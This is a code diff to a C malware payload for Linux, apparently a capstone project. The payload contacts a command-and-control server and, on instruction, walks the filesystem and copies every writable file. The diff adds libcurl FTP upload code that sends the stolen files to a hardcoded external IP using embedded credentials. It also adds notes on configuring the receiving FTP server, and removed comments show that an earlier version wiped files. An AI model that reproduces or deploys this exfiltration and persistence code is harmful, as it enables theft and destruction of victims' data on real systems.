@@ -17,16 +17,18 @@
 */
 
 /* Operating the C2:
- * Leave the directive in "instruction.txt" and serve in at CADDRESS as shown below.
- * 
+ * Leave the directive in "instruction.txt" and serve at CADDRESS as shown below.
+ * The configuration of the FTP is quite sensitive:
+ * 	- unless the server itself is facing the internet, the passive mode port needs to be declared and forwarded to the internet (pasv_min_port and pasv_max_port)
+ * 	- The root directory of the user used to login to the server should be set to the directory that will contain the stolen files. That is why only the file is specified in the FTP link (local_root)
+ * 	- The server must be configured to allow authenticated users to perform write operations (write_enable)
 */
 
 /* 
  * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
- * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and wipe all writable files.
- * Functionality to copy files before wiping them will be a nice addition at some point in the future.
+ * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and copy all writable files.
  * 
- * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many targets do not have monitoring solutions on Linux servers/workstations.
+ * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many Linux targets do not have monitoring solutions.
 */
 
 // Prototypes:
@@ -98,7 +100,7 @@ void Copy(char * rootDirectory) {
 	closedir(dir);
 }
 
-void copyContents(char * fileName, char * suffix) {
+void copyContents(char * fileName, char * suffix) {			// Root dir on the server is /home/itinerant/CONTROLLER/loot/
 
 	CURL * curl;
 	CURLcode res;
@@ -119,12 +121,16 @@ void copyContents(char * fileName, char * suffix) {
 		curl_easy_setopt(curl, CURLOPT_USERNAME, "test");
 		curl_easy_setopt(curl, CURLOPT_PASSWORD, "capstonepassword");
 
-		char prelimLink[] = "ftp://test:capstonepassword@70.77.131.111:5678/home/itinerant/CONTROLLER/loot/";
+		curl_easy_setopt(curl, CURLOPT_FTP_USE_EPSV, 1L);
+
+		char prelimLink[1024] = "ftp://70.77.131.111:5678/";		// test:capstonepassword
 		char * link = strcat(prelimLink, suffix);
 
 		printf("LINK: %s\n", link);
 
-		curl_easy_setopt(curl, CURLOPT_URL, link);			// "ftp://test:capstonepassword@70.77.131.111:5678/home/itinerant/CONTROLLER/loot/"
+		curl_easy_setopt(curl, CURLOPT_URL, link);			// "ftp://70.77.131.111:5678/file.txt" --> only the file needs to be specified
+
+		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);			// Setting file upload option
 
 		curl_easy_setopt(curl, CURLOPT_READDATA, srcFile);
 
